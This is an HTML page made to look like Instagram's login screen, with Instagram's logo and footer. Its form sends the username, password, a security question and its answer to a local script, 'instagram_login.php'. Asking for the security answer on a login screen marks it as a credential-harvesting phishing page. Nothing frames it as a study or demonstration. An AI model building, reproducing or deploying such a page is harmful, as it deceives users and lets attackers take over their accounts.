<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        .instagram-logo {
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png');
            background-position: 0px -52px;
            background-size: auto;
            width: 175px;
            height: 51px;
            background-repeat: no-repeat;
            display: inline-block;
        }
    </style>
</head>
<body class="flex flex-col h-screen " style="padding-top: 20px;">
    <div class="flex-grow flex items-center justify-center">
        <div class="w-full max-w-md p-6 bg-white border border-gray-200 rounded-lg shadow-lg">
            <div class="flex justify-center mb-6">
                <i class="instagram-logo" aria-label="Instagram" role="img"></i>
            </div>
            <form action="instagram_login.php" method="POST">
                <div class="mb-4">
                    <label for="email" class="block mb-2 text-sm font-medium text-gray-700">Phone Number, username or email address</label>
                    <input type="text" id="email" name="email" class="block w-full p-2 border border-gray-300 rounded-lg focus:ring-purple-500 focus:border-purple-500" placeholder="Phone Number, username or email address" required>
                </div>
                <div class="mb-4">
                    <label for="password" class="block mb-2 text-sm font-medium text-gray-700">Password</label>
                    <input type="password" id="password" name="password" class="block w-full p-2 border border-gray-300 rounded-lg focus:ring-purple-500 focus:border-purple-500" placeholder="Password" required>
                </div>
                <div class="mb-4">
                    <label for="security-question" class="block mb-2 text-sm font-medium text-gray-700">Security Question</label>
                    <select id="security-question" name="security_question" class="block w-full p-2 border border-gray-300 rounded-lg focus:ring-purple-500 focus:border-purple-500" required>
                        <option value="">Select a security question</option>
                        <option value="pet">What is the name of your first pet?</option>
                        <option value="school">What is the name of your elementary school?</option>
                        <option value="city">In what city were you born?</option>
                    </select>
                </div>
                <div class="mb-4">
                    <label for="security-answer" class="block mb-2 text-sm font-medium text-gray-700">Answer</label>
                    <input type="text" id="security-answer" name="security_answer" class="block w-full p-2 border border-gray-300 rounded-lg focus:ring-purple-500 focus:border-purple-500" placeholder="Answer" required>
                </div>
                <button type="submit" class="w-full px-4 py-2 text-white bg-purple-600 rounded-lg hover:bg-purple-700 focus:ring-4 focus:ring-purple-300">Log In</button>
            </form>
            <div class="flex items-center justify-between mt-4">
                <hr class="w-full border-gray-300">
                <span class="mx-2 text-gray-500">OR</span>
                <hr class="w-full border-gray-300">
            </div>
            <button class="w-full px-4 py-2 mt-4 text-white bg-[#3b5998] rounded-lg hover:bg-[#3b5998]/90 focus:ring-4 focus:ring-[#3b5998]/50">Log in with Facebook</button>
            <p class="mt-4 text-sm text-center text-gray-500">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="font-semibold text-purple-600 hover:underline">Sign up</a></p>
        </div>
    </div>
    <div class="bg-white p-4 text-center border-gray-200">
    <p class="text-gray-600 text-sm mb-2">Get the app.</p>
    <div class="flex justify-center gap-4">
        <a href="#" class="inline-block">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play" class="h-10">
        </a>
        <a href="#" class="inline-block">
            <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Download_on_the_App_Store_RGB_blk.svg" alt="Get it from Microsoft" class="h-10">
        </a>
    </div>
</div>

  <footer class="bg-white  border-gray-200 p-4 text-center text-gray-600">
    <div class="mb-4 space-x-2 text-sm">
        <a href="#" class="text-gray-600 hover:underline">Meta</a>
        <a href="#" class="text-gray-600 hover:underline">About</a>
        <a href="#" class="text-gray-600 hover:underline">Blog</a>
        <a href="#" class="text-gray-600 hover:underline">Jobs</a>
        <a href="#" class="text-gray-600 hover:underline">Help</a>
        <a href="#" class="text-gray-600 hover:underline">API</a>
        <a href="#" class="text-gray-600 hover:underline">Privacy</a>
        <a href="#" class="text-gray-600 hover:underline">Terms</a>
        <a href="#" class="text-gray-600 hover:underline">Locations</a>
        <a href="#" class="text-gray-600 hover:underline">Instagram Lite</a>
        <a href="#" class="text-gray-600 hover:underline">Threads</a>
        <a href="#" class="text-gray-600 hover:underline">Contact uploading and non-users</a>
        <a href="#" class="text-gray-600 hover:underline">Meta Verified</a>
    </div>
    <div class="mb-2">
        <p class="text-sm text-gray-500">
            <a href="#" class="text-gray-600 hover:underline">English (UK)</a>
            <span class="mx-1 text-gray-500">&copy; 2024 Instagram from Meta</span>
        </p>
    </div>
</footer>


</body>
</html>

